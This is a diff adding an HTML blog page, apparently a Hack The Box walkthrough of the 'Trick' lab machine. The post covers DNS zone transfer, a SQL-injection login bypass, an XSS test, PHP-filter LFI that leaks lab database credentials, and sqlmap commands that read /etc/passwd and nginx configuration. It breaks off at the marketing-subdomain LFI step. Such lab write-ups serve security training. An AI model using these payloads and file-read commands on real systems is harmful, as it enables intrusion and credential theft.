@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Trick HTB Writeup - Complete WalkthroughIntroductionWelcome to my comprehensive walkthrough of Trick from Hack The Box (HTB). This medium-difficulty Linux machine showcases several common vulnerabilit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-Trick">
+<meta property="og:url" content="http://example.com/2025/10/17/HTB-Trick/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="Trick HTB Writeup - Complete WalkthroughIntroductionWelcome to my comprehensive walkthrough of Trick from Hack The Box (HTB). This medium-difficulty Linux machine showcases several common vulnerabilit">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/HTB-Trick/DNS-trick.png">
+<meta property="og:image" content="http://example.com/images/HTB-Trick/Webpage-trick.png">
+<meta property="og:image" content="http://example.com/images/HTB-Trick/base64-trick.png">
+<meta property="article:published_time" content="2025-10-17T18:43:44.000Z">
+<meta property="article:modified_time" content="2025-10-17T18:45:22.319Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="Hack The Box">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/HTB-Trick/DNS-trick.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HTB-Trick</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/10/17/HTB-Fluffy/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/10/17/HTB-Trick/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/10/17/HTB-Trick/&text=HTB-Trick"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/10/17/HTB-Trick/&title=HTB-Trick"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/10/17/HTB-Trick/&is_video=false&description=HTB-Trick"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB-Trick&body=Check out this article: http://example.com/2025/10/17/HTB-Trick/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/10/17/HTB-Trick/&title=HTB-Trick"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/10/17/HTB-Trick/&title=HTB-Trick"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/10/17/HTB-Trick/&title=HTB-Trick"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/10/17/HTB-Trick/&title=HTB-Trick"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/10/17/HTB-Trick/&name=HTB-Trick&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/10/17/HTB-Trick/&t=HTB-Trick"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Trick-HTB-Writeup-Complete-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">Trick HTB Writeup - Complete Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-Results"><span class="toc-number">1.2.1.</span> <span class="toc-text">Nmap Scan Results</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS-Enumeration"><span class="toc-number">1.2.2.</span> <span class="toc-text">DNS Enumeration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Application-Analysis"><span class="toc-number">1.3.</span> <span class="toc-text">Web Application Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Preprod-Payroll-Subdomain"><span class="toc-number">1.3.1.</span> <span class="toc-text">Preprod-Payroll Subdomain</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Injection-Vulnerability"><span class="toc-number">1.3.2.</span> <span class="toc-text">SQL Injection Vulnerability</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Post-Authentication-Enumeration"><span class="toc-number">1.3.3.</span> <span class="toc-text">Post-Authentication Enumeration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-LFI"><span class="toc-number">1.4.</span> <span class="toc-text">Exploiting LFI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reading-PHP-Files"><span class="toc-number">1.4.1.</span> <span class="toc-text">Reading PHP Files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Database-Credentials-Discovered"><span class="toc-number">1.4.2.</span> <span class="toc-text">Database Credentials Discovered</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMap-Exploitation"><span class="toc-number">1.5.</span> <span class="toc-text">SQLMap Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Automated-SQL-Injection"><span class="toc-number">1.5.1.</span> <span class="toc-text">Automated SQL Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Checking-Database-Privileges"><span class="toc-number">1.5.2.</span> <span class="toc-text">Checking Database Privileges</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reading-System-Files"><span class="toc-number">1.5.3.</span> <span class="toc-text">Reading System Files</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Additional-Subdomain-Discovery"><span class="toc-number">1.6.</span> <span class="toc-text">Additional Subdomain Discovery</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nginx-Configuration"><span class="toc-number">1.6.1.</span> <span class="toc-text">Nginx Configuration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-Preprod-Marketing"><span class="toc-number">1.7.</span> <span class="toc-text">Exploiting Preprod-Marketing</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LFI-Vulnerability-Discovery"><span class="toc-number">1.7.1.</span> <span class="toc-text">LFI Vulnerability Discovery</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypassing-Directory-Traversal-Filters"><span class="toc-number">1.7.2.</span> <span class="toc-text">Bypassing Directory Traversal Filters</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Filter-Bypass-Technique"><span class="toc-number">1.7.3.</span> <span class="toc-text">Filter Bypass Technique</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Retrieving-SSH-Private-Key"><span class="toc-number">1.7.4.</span> <span class="toc-text">Retrieving SSH Private Key</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-Access"><span class="toc-number">1.7.5.</span> <span class="toc-text">SSH Access</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">1.8.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Sudo-Privileges"><span class="toc-number">1.8.1.</span> <span class="toc-text">Sudo Privileges</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fail2ban-Exploitation"><span class="toc-number">1.8.2.</span> <span class="toc-text">Fail2ban Exploitation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.9.</span> <span class="toc-text">Conclusion</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HTB-Trick
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-10-17T18:43:44.000Z" class="dt-published" itemprop="datePublished">2025-10-17</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Hack-The-Box/" rel="tag">Hack The Box</a>, <a class="p-category" href="/tags/Linux/" rel="tag">Linux</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Trick-HTB-Writeup-Complete-Walkthrough"><a href="#Trick-HTB-Writeup-Complete-Walkthrough" class="headerlink" title="Trick HTB Writeup - Complete Walkthrough"></a>Trick HTB Writeup - Complete Walkthrough</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Welcome to my comprehensive walkthrough of <strong>Trick</strong> from Hack The Box (HTB). This medium-difficulty Linux machine showcases several common vulnerabilities including DNS zone transfer, SQL injection, Local File Inclusion (LFI), and privilege escalation through fail2ban misconfiguration. In this writeup, I’ll demonstrate how to exploit these vulnerabilities step-by-step to achieve root access.</p>
+<p><strong>Tools Used:</strong> Nmap, dig, Burp Suite, SQLMap, SSH, Netcat</p>
+<p>This HTB writeup and walkthrough is intended for educational purposes to help aspiring penetration testers understand real-world attack vectors and defensive strategies.</p>
+<hr>
+<h2 id="Initial-Enumeration"><a href="#Initial-Enumeration" class="headerlink" title="Initial Enumeration"></a>Initial Enumeration</h2><h3 id="Nmap-Scan-Results"><a href="#Nmap-Scan-Results" class="headerlink" title="Nmap Scan Results"></a>Nmap Scan Results</h3><p>Starting with our initial Nmap scan, we discover several open ports:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE REASON         VERSION</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 </span><br><span class="line">25/tcp open  smtp?   syn-ack ttl 63</span><br><span class="line">|_smtp-commands: Couldn&#x27;t establish connection on port 25</span><br><span class="line">53/tcp open  domain  syn-ack ttl 63 ISC BIND 9.11.5-P4-5.1+deb10u7 </span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian</span><br><span class="line">80/tcp open  http    syn-ack ttl 63 nginx 1.14.2</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA</span><br><span class="line">|_http-title: Coming Soon - Start Bootstrap Theme</span><br></pre></td></tr></table></figure>
+
+<h3 id="DNS-Enumeration"><a href="#DNS-Enumeration" class="headerlink" title="DNS Enumeration"></a>DNS Enumeration</h3><p>Digging through the DNS, we discover the domain name <code>trick.htb</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @10.129.100.122 -x 10.129.100.122 +short</span><br></pre></td></tr></table></figure>
+
+<p>DNS over TCP suggests that DNS zone transfers may be enabled. Let’s attempt a zone transfer:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @10.129.100.122 trick.htb AXFR</span><br></pre></td></tr></table></figure>
+
+<p><strong>Remember to add <code>trick.htb</code> to your <code>/etc/hosts</code> file.</strong></p>
+<p><img src="/images/HTB-Trick/DNS-trick.png" alt="DNS Zone Transfer Results"></p>
+<p>The zone transfer reveals an additional subdomain: <code>preprod-payroll.trick.htb</code>. Add this to <code>/etc/hosts</code> as well.</p>
+<hr>
+<h2 id="Web-Application-Analysis"><a href="#Web-Application-Analysis" class="headerlink" title="Web Application Analysis"></a>Web Application Analysis</h2><h3 id="Preprod-Payroll-Subdomain"><a href="#Preprod-Payroll-Subdomain" class="headerlink" title="Preprod-Payroll Subdomain"></a>Preprod-Payroll Subdomain</h3><p>Navigating to the preprod-payroll subdomain, we discover a login form.</p>
+<p><img src="/images/HTB-Trick/Webpage-trick.png" alt="Preprod Payroll Webpage"></p>
+<h3 id="SQL-Injection-Vulnerability"><a href="#SQL-Injection-Vulnerability" class="headerlink" title="SQL Injection Vulnerability"></a>SQL Injection Vulnerability</h3><p>Inspecting the HTML source code, we find a JavaScript function that handles the login form:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&#x27;#login-form&#x27;</span>).<span class="title function_">submit</span>(<span class="keyword">function</span>(<span class="params">e</span>)&#123;</span><br><span class="line">	e.<span class="title function_">preventDefault</span>()</span><br><span class="line">	$(<span class="string">&#x27;#login-form button[type=&quot;button&quot;]&#x27;</span>).<span class="title function_">attr</span>(<span class="string">&#x27;disabled&#x27;</span>,<span class="literal">true</span>).<span class="title function_">html</span>(<span class="string">&#x27;Logging in...&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>($(<span class="variable language_">this</span>).<span class="title function_">find</span>(<span class="string">&#x27;.alert-danger&#x27;</span>).<span class="property">length</span> &gt; <span class="number">0</span> )</span><br><span class="line">		$(<span class="variable language_">this</span>).<span class="title function_">find</span>(<span class="string">&#x27;.alert-danger&#x27;</span>).<span class="title function_">remove</span>();</span><br><span class="line">	$.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">		<span class="attr">url</span>:<span class="string">&#x27;ajax.php?action=login&#x27;</span>,</span><br><span class="line">		<span class="attr">method</span>:<span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">		<span class="attr">data</span>:$(<span class="variable language_">this</span>).<span class="title function_">serialize</span>(),</span><br><span class="line">		<span class="attr">error</span>:<span class="function"><span class="params">err</span>=&gt;</span>&#123;</span><br><span class="line">			<span class="variable language_">console</span>.<span class="title function_">log</span>(err)</span><br><span class="line">	$(<span class="string">&#x27;#login-form button[type=&quot;button&quot;]&#x27;</span>).<span class="title function_">removeAttr</span>(<span class="string">&#x27;disabled&#x27;</span>).<span class="title function_">html</span>(<span class="string">&#x27;Login&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		&#125;,</span><br><span class="line">		<span class="attr">success</span>:<span class="keyword">function</span>(<span class="params">resp</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>(resp == <span class="number">1</span>)&#123;</span><br><span class="line">				location.<span class="property">href</span> =<span class="string">&#x27;index.php?page=home&#x27;</span>;</span><br><span class="line">			&#125;<span class="keyword">else</span> <span class="keyword">if</span>(resp == <span class="number">2</span>)&#123;</span><br><span class="line">				location.<span class="property">href</span> =<span class="string">&#x27;voting.php&#x27;</span>;</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				$(<span class="string">&#x27;#login-form&#x27;</span>).<span class="title function_">prepend</span>(<span class="string">&#x27;&lt;div class=&quot;alert alert-danger&quot;&gt;Username or password is incorrect.&lt;/div&gt;&#x27;</span>)</span><br><span class="line">				$(<span class="string">&#x27;#login-form button[type=&quot;button&quot;]&#x27;</span>).<span class="title function_">removeAttr</span>(<span class="string">&#x27;disabled&#x27;</span>).<span class="title function_">html</span>(<span class="string">&#x27;Login&#x27;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>I noticed there was no whitelisting or input validation that would prevent SQL injection attempts. Testing with a simple payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;-&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>Using this for both username and password, we successfully bypass authentication and log in as admin.</p>
+<h3 id="Post-Authentication-Enumeration"><a href="#Post-Authentication-Enumeration" class="headerlink" title="Post-Authentication Enumeration"></a>Post-Authentication Enumeration</h3><p>After gaining access, we discover several interesting findings:</p>
+<p><strong>Employee Information:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|John|C|Smith|IT Department|Programmer|</span><br></pre></td></tr></table></figure>
+
+<p><strong>Cross-Site Scripting (XSS):</strong> Multiple forms are vulnerable to stored XSS. Testing with:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt; </span><br></pre></td></tr></table></figure>
+
+<p><strong>Local File Inclusion (LFI):</strong> The application appears vulnerable to LFI through the page parameter:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://preprod-payroll.trick.htb/index.php?page=users</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Exploiting-LFI"><a href="#Exploiting-LFI" class="headerlink" title="Exploiting LFI"></a>Exploiting LFI</h2><h3 id="Reading-PHP-Files"><a href="#Reading-PHP-Files" class="headerlink" title="Reading PHP Files"></a>Reading PHP Files</h3><p>Intercepting requests through Burp Suite, we can abuse the LFI vulnerability using PHP filters:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?page=php://filter/convert.base64-encode/resource=deductions HTTP/1.1</span><br><span class="line">Host: preprod-payroll.trick.htb</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: el-GR,el;q=0.9,en;q=0.8</span><br><span class="line">Cookie: PHPSESSID=0d5qoh1jcagls1duj8fjqqnpco</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
+
+<p>After decoding the file, it hints at the existence of <code>db_connect.php</code>. Let’s retrieve that as well:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?page=php://filter/convert.base64-encode/resource=db_connect.php </span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/HTB-Trick/base64-trick.png" alt="Base64 Encoded Database Credentials"></p>
+<h3 id="Database-Credentials-Discovered"><a href="#Database-Credentials-Discovered" class="headerlink" title="Database Credentials Discovered"></a>Database Credentials Discovered</h3><p>Decoding the base64 output reveals database credentials:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;remo&#x27;,&#x27;TrulyImpossiblePasswordLmao123&#x27;,&#x27;payroll_db&#x27;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="SQLMap-Exploitation"><a href="#SQLMap-Exploitation" class="headerlink" title="SQLMap Exploitation"></a>SQLMap Exploitation</h2><h3 id="Automated-SQL-Injection"><a href="#Automated-SQL-Injection" class="headerlink" title="Automated SQL Injection"></a>Automated SQL Injection</h3><p>With confirmed SQL injection vulnerability, let’s leverage SQLMap for deeper exploitation:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r login.req -p username --level 5 --risk 3 --technique=BEUS --batch</span><br></pre></td></tr></table></figure>
+
+<p><strong>Output:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">Parameter: username (POST)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)</span><br><span class="line">    Payload: username=adc&#x27; OR NOT 4452=4452-- JVvx&amp;password=abc</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: username=adc&#x27; OR (SELECT 7557 FROM(SELECT COUNT(*),CONCAT(0x7178767671,(SELECT (ELT(7557=7557,1))),0x71766b6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- wpxf&amp;password=abc</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+
+<h3 id="Checking-Database-Privileges"><a href="#Checking-Database-Privileges" class="headerlink" title="Checking Database Privileges"></a>Checking Database Privileges</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r login.req -p username --privileges</span><br></pre></td></tr></table></figure>
+
+<p><strong>Output:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">database management system users privileges:</span><br><span class="line">[*] &#x27;remo&#x27;@&#x27;localhost&#x27; [1]:</span><br><span class="line">    privilege: FILE</span><br></pre></td></tr></table></figure>
+
+<p>The database user <code>remo</code> has FILE privileges, which allows reading files from the filesystem.</p>
+<h3 id="Reading-System-Files"><a href="#Reading-System-Files" class="headerlink" title="Reading System Files"></a>Reading System Files</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r login.req -p username --batch --file-read=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/panosoiko/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd</span><br></pre></td></tr></table></figure>
+
+<p><strong>Result:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">michael:x:1001:1001::/home/michael:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>We discover a user named <code>michael</code> on the system.</p>
+<hr>
+<h2 id="Additional-Subdomain-Discovery"><a href="#Additional-Subdomain-Discovery" class="headerlink" title="Additional Subdomain Discovery"></a>Additional Subdomain Discovery</h2><h3 id="Nginx-Configuration"><a href="#Nginx-Configuration" class="headerlink" title="Nginx Configuration"></a>Nginx Configuration</h3><p>Reading the default Nginx configuration:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --data=&quot;username=abc&amp;password=abc&quot; -p username --batch --file-read=/etc/nginx/sites-enabled/default</span><br></pre></td></tr></table></figure>
+
+<p><strong>Discovery:</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server &#123; listen <span class="number">80</span>; listen [::]:<span class="number">80</span>; server_name preprod-marketing.trick.htb;</span><br></pre></td></tr></table></figure>
+
+<p>Another subdomain: <code>preprod-marketing.trick.htb</code>. Add this to <code>/etc/hosts</code>.</p>
+<hr>
+<h2 id="Exploiting-Preprod-Marketing"><a href="#Exploiting-Preprod-Marketing" class="headerlink" title="Exploiting Preprod-Marketing"></a>Exploiting Preprod-Marketing</h2><h3 id="LFI-Vulnerability-Discovery"><a href="#LFI-Vulnerability-Discovery" class="headerlink" title="LFI Vulnerability Discovery"></a>LFI Vulnerability Discovery</h3><p>Navigating to the marketing subdomain:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://preprod-marketing.trick.htb/index.php?page=about.html</span><br></pre></td></tr></table></figure>
+
+<p>If the code is similar to the payroll application, it might be vulnerable to Local File Inclusion. Based on the Nginx vHost configuration, the site is located in <code>/var/www/market</code>, meaning we need to traverse up 3 directories to read <code>/etc/passwd</code>.</p>
